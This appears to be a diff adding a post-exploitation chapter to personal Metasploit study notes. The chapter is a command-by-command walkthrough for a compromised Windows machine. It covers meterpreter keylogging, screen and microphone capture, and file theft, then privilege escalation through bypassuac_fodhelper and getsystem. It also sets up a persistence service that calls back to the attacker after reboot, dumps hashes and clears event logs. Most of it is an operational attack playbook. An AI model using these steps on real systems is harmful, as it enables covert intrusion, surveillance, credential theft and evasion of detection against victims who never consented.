@@ -476,3 +476,110 @@ such as:
                 then in update tab, in update mode set "extract and update files" and in overwrite mode set "overwrite all files" 
                 then in text and icon tab, browse for "Load SFX icon from the file" and select the icon file and then click "OK"
                 the masked payload will be created
+
+
+
+____________________________________________________________________
+POST EXPLOITATION
+____________________________________________________________________
+this module is all about the possibilities that happens after exploiting and gaining access to the target machine and perform stuffs like:
+traversing through folders
+lookup for saved/hashed passwords over all applications
+set keyloggers
+escalate privilege
+persist connection for later usage even after the compromised target machine is restarted/rebooted
+hack into networks/other machines that belongs to the target's network and much more
+to search for post exploitation modules in msfc we can use: search post/windows (for windows)
+
+
+we've seen some commands in meterpreter in the previously 2 chapter, now we'll dive deep into those.
+some of the COMMANDS that we use in the METERPRETER session are as follows:
+        > help (opens all available commands in meterpreter)
+        > background|bg (this helps to go back to the normal msfc without closing the session which still runs in the background but to access that shell "sessions -i <session_Id>")
+        > guid (get the session's user id)
+        > getuid (tells which we are on the target machine)
+        > pwd,ls,dir,cat,cd (works normally like linux commands)
+        > download <file_name> (download file to attacker's machine (/Desktop))
+        > upload <file_name> (upload file to target machine)
+        > shell (execute cmds straight into the target machine by which it opens a SSH like remote terminal)
+        > arp (displays the arp table)
+        > netstat (prints all connections target machine has[Here we can see that target has established a connection to the attacker's listener])
+
+        following are some system commands:
+        > execute -f <application_name> (<application_name> = calc, this also returns to executed file's process id)
+        > ps (list all files running on the target machine)
+        > kill <PID> (the PID can be found out from the ps table in the PID column)
+        > reboot, shutdown
+        > sysinfo (additional info about the target machine)
+        > mouse (move mouse to specific location (Usage opens which is S.E.))
+        > keyscan_start (starts keylogging)
+        > keyscan_dump (dumps sniffed keys recorded so far)
+        > keyscan_stop (stops keylogging)
+        > screenshot (snaps screenshots of target machine)
+        > screenshare (live screen sharing of target machine)
+        > record_mic -d <record_seconds> (record sound from target machine's microphone)
+
+ELEVATE PRIVILEGE USING MSFC(elevating modules are present under local msfc hierarchy in exploit/):
+        this is performed specifically after we created a meterpreter session with a windows 10 PC but applies the same for other OS platforms as well
+        use the following cmd(here we'll just fuzz through different search keywords):
+        since we're performing a post exploitation the type of exploit would be under the local folder(i.e. msf module folder hierarchy) 
+        make sure when performing this exploit execution the active meterpreter session of target system must be running/at bg
+        > search bypassuac (UAC - user account control)
+        > search 2020
+        from above search result lets try using: windows/local/cve_2020_0796_smbghost
+        > windows/local/cve_2020_0796_smbghost
+        in 'show info' we can check what sort of target it supports for that exploit
+        'show options' wants a param called SESSION to be set and it is nothing but the meterpreter session we created with the windows PC that was compromised
+        so to set it we do:
+        > set SESSION <session_Id>
+        > run (THIS WAS A FAILURE SO WE'LL TRY ANOTHER ONE)
+        another exploit we found out from 'search 2020' and to use it:
+        > use exploit/windows/local/cve_2020_0668_service_tracing
+        > set SESSION <session_Id>
+        > set LHOST <attacker's_ip>
+        > set LPORT <attacker's_port> (make sure that you enter a different port number from the one you created already to exploit the target machine. use 'sessions' cmd and know the already opened ports in attacker's PC)
+        > run (THIS WAS A FAILURE SO WE'LL TRY ANOTHER ONE)
+        another exploit we found out from 'bypassuac' and to use it:
+        > use exploit/windows/local/bypassuac_fodhelper
+        (just before bruteforcing through all exploits that are listed in the search result make sure to read info at the search table and what it does using 'show info')
+        > set SESSION 1
+        > run (THIS WAS A SUCCESS)
+        Even though we get back a meterpreter session with the exploit on cmd 'getuid' we are still a normal user and not root level user
+        because the exploit info says that it will spawn a second shell (SESSION 2) with UAC turned off
+        so previously from the system commands in msfc we would have tried the cmd 'getsystem' for elevating privilege which didn't work but now after executing this exploit
+        if we run 'getsystem' it returns the following:
+        ... got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)). now do 'getuid' it returns 'NT AUTHORITY/SYSTEM'
+
+CREATING PERSISTENCY ON THE TARGET SYSTEM USING MSFC(persistence modules are present under local msfc hierarchy in exploit/):
+        after we've compromised the target machine and then elevated our privileges in now we need to create a persist connection with it even when the victim restarts/reboots the system
+        so make sure we currently have 2 session running where:
+        SESSION 1 being the payload the user executed on behalf of us/or with the help of an exploit
+        SESSSION 2 being the privilege elevation
+        we can search for the foll in msfc:
+        > search persistence (keyword used for searching persistence modules in msfc)
+        from the result we'll use:
+        > use exploit/windows/local/persistence/persistence_service
+        > show info (read the description to know what the exploit would do)
+        now in 'show options' we need to set a SESSION, so make sure to set it with the escalation session we performed previously(SESSION 2) as follows:
+        > set SESSION 2
+        > set RETRY_TIME 10 (use 'show options' to know this)
+        > run
+        now we get a meterpreter session running, but what's special is that it will automatically connect even if target's PC is restarted/rebooted since we ran the persistence module in msfc we can test it out by using:
+        > reboot (in meterpreter session that was created the 3rd time)
+        now we can close all and reopen msfc and use:
+        > use exploit/multi/handler
+        and set options for it like we did earlier (LHOST of attacker_ip, and LPORT of attacker_port i.e. SESSION 2's port number because we used the persitence module upon SESSION 2 (set SESSION 2))
+        what happens in the target's machine after switching on is that it tries to connect to our attacker's PC which has been listening to port X and returns a shell
+        the best part in this is that we don't need to repeat the whole process of elevating privilege so on to stay where we left off
+
+since we're in post exploitation we can use post/windows to search for all post exploit modules related to windows:
+eg: post/windows/gather/checkvm (modules that check whether target is VM or Physical PC)
+eg: post/windows/wlan/wlan_profile (modules that check whether target is VM or Physical PC)
+eg: post/windows/gather/hashdump (gives all hashes of the users on the target windows machine)
+
+OTHER USEFUL METERPRETER CMDS:
+        > search -h (shows different usage of search techniques to search for specific file types in target system)
+        eg: search -f *.<file_extension> (for searching types of files in the target system)
+        > clearev (clears system and security logs) (SIMILAR TO COVERING TRACKS)
+        NOTE: we can run the msfc modules even from the meterpreter shell
+        eg: > run post/windows/gather/enum_applications (prints all installed application in the target's windows machine)
